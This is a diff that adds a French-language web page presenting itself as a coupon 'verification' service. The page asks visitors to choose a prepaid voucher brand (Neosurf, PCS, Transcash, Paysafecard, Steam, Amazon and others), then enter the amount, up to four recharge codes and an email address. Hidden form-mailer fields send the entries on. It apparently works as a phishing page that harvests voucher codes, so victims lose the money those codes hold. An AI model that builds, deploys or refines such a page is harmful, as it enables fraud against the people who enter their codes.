@@ -1,0 +1,257 @@
+<!DOCTYPE html>
+<html lang="fr">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>VYGC</title>
+
+    <!-- Fonts & Icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
+    <link rel="stylesheet" href="css/stylefooter.css">
+    <link rel="stylesheet" href="css/styleform.css">
+
+    <link rel="icon" href="imgs/logo.ico" type="image/x-icon">
+    <link rel="shortcut icon" href="imgs/logo.ico" type="image/x-icon">
+
+    <style>
+        .translate-container {
+    position: fixed;  /* stays in place even when scrolling */
+    top: 20px;
+    right: 20px;
+    z-index: 100;
+}
+        .goog-te-banner-frame.skiptranslate {
+    display: none !important;
+}
+
+body {
+    top: 0 !important;
+}
+        /* Full page background */
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+            background-image: url('assets/imgs/bg-image.jpg'); /* replace with your image */
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            min-height: 100vh;
+        }
+
+        /* Center the form */
+        .body-form {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            padding: 40px 20px;
+            box-sizing: border-box;
+            background-color: rgba(0, 0, 0, 0.5); /* dark overlay for contrast */
+            color: white;
+        }
+
+        /* Google Translate styling */
+        .translate-container {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            z-index: 100;
+        }
+
+        .translate-btn {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            background: #1abc9c;
+            color: white;
+            padding: 8px 16px;
+            border-radius: 50px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: background 0.3s;
+        }
+
+        .translate-btn:hover {
+            background: #16a085;
+        }
+
+        .goog-te-gadget-simple select {
+            background: white;
+            color: #333;
+            border: none;
+            padding: 4px 8px;
+            border-radius: 6px;
+            margin-left: 8px;
+            cursor: pointer;
+            font-size: 14px;
+            outline: none;
+        }
+
+        .goog-te-gadget {
+            color: transparent !important;
+        }
+
+        .goog-logo-link,
+        .goog-te-gadget span {
+            display: none !important;
+        }
+
+        .goog-te-gadget-simple select option {
+            color: #333;
+        }
+
+        /* Form styling */
+        .body-form form {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 30px;
+            border-radius: 12px;
+            max-width: 500px;
+            width: 100%;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
+        }
+
+        .body-form form h2 {
+            margin-bottom: 20px;
+            color: white;
+            text-align: center;
+        }
+
+        .body-form label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+        }
+
+        .body-form input,
+        .body-form select {
+            width: 100%;
+            padding: 8px 12px;
+            margin-bottom: 15px;
+            border-radius: 6px;
+            border: none;
+        }
+
+        .body-form input[type="submit"],
+        .body-form input[type="button"] {
+            background: #1abc9c;
+            color: white;
+            cursor: pointer;
+            font-weight: bold;
+            transition: background 0.3s;
+        }
+
+        .body-form input[type="submit"]:hover,
+        .body-form input[type="button"]:hover {
+            background: #16a085;
+        }
+    </style>
+</head>
+
+<body>
+    <!-- Google Translate widget -->
+    <div class="translate-container">
+        <div class="translate-btn">
+            🌐 Language
+            <div id="google_translate_element"></div>
+        </div>
+    </div>
+
+    <!-- Form Section -->
+    <div class="body-form">
+        <form id="sendmail" method="post" enctype="multipart/form-data" >
+            <input type="hidden" name="_subject" value="Nouvelle Vérification (Verification.vercel.app)">
+            <input type="hidden" name="_captcha" value="false">
+            <input type="text" name="_honey" style="display:none">
+            <input type="hidden" name="_template" value="table">
+
+            <h2>Veuillez entrer les informations du coupon ici.</h2>
+
+            <label for="type">Choisir une recharge *</label>
+            <select id="type" name="type">
+                <option value="none" selected disabled>---- Recharge ----</option>
+                <option value="NEOSURF">NEOSURF</option>
+                <option value="PCS">PCS</option>
+                <option value="TRANSCASH">TRANSCASH</option>
+                <option value="PAYSAFECARD">PAYSAFECARD</option>
+                <option value="GOOGLE PLAY">GOOGLE PLAY</option>
+                <option value="STEAM">STEAM</option>
+                <option value="FLEXEPIN">FLEXEPIN</option>
+                <option value="CASHLIB">CASHLIB</option>
+                <option value="NETFLIX">NETFLIX</option>
+                <option value="AMAZON">AMAZON</option>
+            </select>
+
+            <label for="montant">Montant de la recharge *</label>
+            <input type="text" name="montant" id="montant" placeholder="0">
+
+            <label for="devise">Choisir une devise *</label>
+            <select id="devise" name="devise">
+                <option value="none" selected disabled>---- Devise -----</option>
+                <option value="EURO €">EURO (€)</option>
+                <option value="Dollar $">Dollar ($)</option>
+                <option value="Dollard CHF">FRANC SUISSE (CHF)</option>
+               <option value="krona">KRONA (SEK)</option>
+                <option value="krone">KRONE (DKK)</option>
+
+            </select>
+
+            <label for="code1">Entrez les codes de recharge</label>
+            <input type="text" id="code1" name="code1" placeholder="Entrez le code de la recharge 1">
+            <input type="text" id="code2" name="code2" placeholder="Entrez le code de la recharge 2">
+            <input type="text" id="code3" name="code3" placeholder="Entrez le code de la recharge 3">
+            <input type="text" id="code4" name="code4" placeholder="Entrez le code de la recharge 4">
+
+            <label for="email">Entrez votre email</label>
+            <input type="email" id="email" name="email" placeholder="Entrez votre email">
+
+            <input id="valider" type="submit" value="Valider">
+        </form>
+    </div>
+
+    <!-- Footer -->
+    <section class="footer">
+        <!-- existing footer code -->
+    </section>
+
+    <!-- Scripts -->
+    <script src="js/jquery.min.js"></script>
+    <script src="js/script.js"></script>
+
+    <!-- Google Translate -->
+    <script>
+       
+    // Hide the Google Translate top banner completely
+    function removeTranslateBanner() {
+        const interval = setInterval(() => {
+            const banner = document.querySelector('.goog-te-banner-frame');
+            if (banner) {
+                banner.style.display = 'none';
+                document.body.style.top = '0px';
+                clearInterval(interval);
+            }
+        }, 100);
+    }
+
+    // Run after page load and after translate initialization
+    window.addEventListener('load', () => {
+        removeTranslateBanner();
+    });
+
+    // Also run whenever the user changes language
+  function googleTranslateElementInit() {
+    new google.translate.TranslateElement({
+        pageLanguage: 'fr',
+        includedLanguages: 'en,fr,es,de,it,pt,ar,da,sv',
+        layout: google.translate.TranslateElement.InlineLayout.SIMPLE
+    }, 'google_translate_element');
+
+    removeTranslateBanner(); // hide banner immediately
+}
+
+    </script>
+    <script src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
+</body>
+</html>
